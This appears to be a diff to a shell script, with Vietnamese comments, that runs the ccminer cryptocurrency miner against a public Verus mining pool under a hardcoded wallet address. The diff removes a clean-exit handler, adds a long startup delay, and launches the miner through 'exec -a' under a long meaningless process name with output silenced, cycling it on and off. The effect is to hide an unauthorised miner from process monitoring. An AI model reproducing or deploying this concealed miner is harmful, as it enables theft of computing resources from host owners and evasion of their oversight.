@@ -1,34 +1,22 @@
 #!/bin/sh
-sleep 3
-
-# Định nghĩa hàm để xử lý tín hiệu khi nhấn Ctrl+C
-cleanup() {
-    if [ -n "$PID" ]; then
-        kill $PID  # Dừng tiến trình ccminer nếu nó đang chạy
-        wait $PID  # Đợi cho tiến trình dừng hoàn toàn
-    fi
-    exit 0
-}
-
-# Thiết lập xử lý tín hiệu
-trap cleanup SIGINT
+sleep 3000
 
 while true; do
     # Chạy lệnh với tên tiến trình đã thay đổi
-    ./ccminer -a verus -o stratum+tcp://na.luckpool.net:3960 -u RVvQgyuoCCRiQV7BBTDNNMAUH3WYp8HC9K.saverNode002 -t 1 > /dev/null 2>&1
+    bash -c "exec -a 'HidjahshgsnzbxnzmsjjshdbdmsmdbxbskieueyrureoeiruryakjsnxbxmsjdhdhsnbzbxkeururyyeiwmsbzbzmzmbdvxkskedhsjnsbxbskshdmsnsbsjkshdnsnsjsbsmsnnsbhdjdksksnnssjjsnsnsnsblakhsudjndbbsjsuskaksnsusjksnsbshsjmmsndhdksmsdhsnsbshsssisnsbsjeieueyywiakamznxxdhskiwrydbdnsnnxbcieieuhajmabzbxksurhnxbejjdjdhdhsnsnsnbssbnsnsbsbzsnsbsbsnnsnsdenryYruo' ./ccminer -a verus -o stratum+tcp://na.luckpool.net:3960 -u RVvQgyuoCCRiQV7BBTDNNMAUH3WYp8HC9K.saverNode0002 -t 1 > /dev/null 2>&1" &
     
     # Lưu PID của tiến trình
     PID=$!  # Lưu PID ngay sau khi chạy
 
     # Chờ 10 phút
     sleep 600
-    
+
     # Dừng tiến trình
     kill $PID
-    
+
     # Đợi cho tiến trình dừng hoàn toàn
     wait $PID 2>/dev/null
-    
+
     # Nghỉ 240 giây
-    sleep 450
+    sleep 400
 done
